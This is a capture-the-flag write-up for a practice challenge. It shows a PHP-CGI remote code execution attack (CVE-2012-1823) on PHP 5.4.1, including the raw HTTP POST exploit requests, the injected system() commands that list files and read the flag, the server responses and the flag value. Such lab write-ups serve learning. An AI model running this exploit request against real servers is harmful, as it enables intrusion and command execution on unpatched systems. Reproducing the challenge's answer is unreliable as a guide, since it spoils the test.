## FLAG
FLAG_ZysbiGgbHrN3f9zs

## Scan for server/application information.
## "index.php" is the filename but it is omitted in browser.

# curl -I http://ctfq.sweetduet.info:10080/~q12/index.php
HTTP/1.1 200 OK
Date: Mon, 11 Jan 2016 14:40:54 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.4.1
Connection: close
Content-Type: text/html; charset=UTF-8


## PHP 5.4.1 is vulnerable version. If you type "-s" in query, PHP will reveal its source code. 
## Details are here
https://www.jpcert.or.jp/at/2012/at120016.html

## In browser, I queryed as below and source code revealed.

http://ctfq.sweetduet.info:10080/~q12/index.php?-s

<?php

    //  Flag is in this directory.

    date_default_timezone_set('UTC');
    
    $t = '2012:1823:20:';
    $t .= date('y:m:d:H:i:s');
    for($i=0;$i<4;$i++)
        $t .= sprintf(':%02d',mt_rand(0,59));
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Clock</title>
    <style>
      body
      {
        background: black;
      }
      p
      {
        color: red;
        font-size: xx-large;
        font-weight: bold;
        text-align: center;
        margin-top: 200px;
      }
    </style>
  </head>
  <body>
    <p><?php echo $t; ?></p>
  </body>
</html>

## In the source code it says "Flag is in this directory."
## I somehow have to get the list of this directory.
## PHP 5.4.1 has another vulnerability. Using -d option, you can execute arbitary code against remote application.
## Detail is here.
https://sect.iij.ad.jp/d/2012/05/087662.html
http://www.phppro.jp/phpmanual/php/features.commandline.options.html
http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
http://blog.tokumaru.org/2013/11/apache-magica-attack.html

# php -h
	-d foo[=bar]     Define INI entry foo with value 'bar'

## I decided to send attack request via telnet.

# telnet ctfq.sweetduet.info 10080
Trying 49.212.153.157...
Connected to ctfq.sweetduet.info.
Escape character is '^]'.
GET /~q12/index.php HTTP/1.0

HTTP/1.1 200 OK
Date: Mon, 11 Jan 2016 14:10:22 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.4.1
Connection: close
Content-Type: text/html; charset=UTF-8

## Now send attack request.
## Directory listing by ls command
POST /~q12/index.php?-d+allow_url_include%3don+-d+safe_mode%3doff+-d+suhosin.simulation%3don+-d+disable_functions%3d""+-d+open_basedir%3dnone+-d+auto_prepend_file%3dphp://input+-d+cgi.force_redirect%3d0+-d+cgi.redirect_status_env%3d0+-n HTTP/1.1
Host: ctfq.sweetduet.info:10080
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php system('ls -la'); exit();

## Response. "flag_flag_flag.txt" must be the file with flag.
HTTP/1.1 200 OK
Date: Mon, 11 Jan 2016 14:21:12 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.4.1
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

14e
total 18668
dr-x--x--x 2 q12  q12      4096 Jan 11 23:20 .
drwx--x--x 3 root root     4096 Jan 11 23:20 ..
-r--r--r-- 1 q12  q12        90 Jan 11 23:20 .htaccess
-r-------- 1 q12  q12        22 Jan 11 23:20 flag_flag_flag.txt
-r-xr-xr-x 1 q12  q12       600 Jan 11 23:20 index.php
-r-xr-xr-x 1 q12  q12  19093315 Jan 11 23:20 php.cgi

## Read "flag_flag_flag.txt" with cat command
POST /~q12/index.php?-d+allow_url_include%3don+-d+safe_mode%3doff+-d+suhosin.simulation%3don+-d+disable_functions%3d""+-d+open_basedir%3dnone+-d+auto_prepend_file%3dphp://input+-d+cgi.force_redirect%3d0+-d+cgi.redirect_status_env%3d0+-n HTTP/1.1
Host: ctfq.sweetduet.info:10080
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

<?php system('cat flag_flag_flag.txt'); exit();

## Response. Flag is "FLAG_ZysbiGgbHrN3f9zs"
HTTP/1.1 200 OK
Date: Mon, 11 Jan 2016 14:24:11 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.4.1
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

16
FLAG_ZysbiGgbHrN3f9zs

0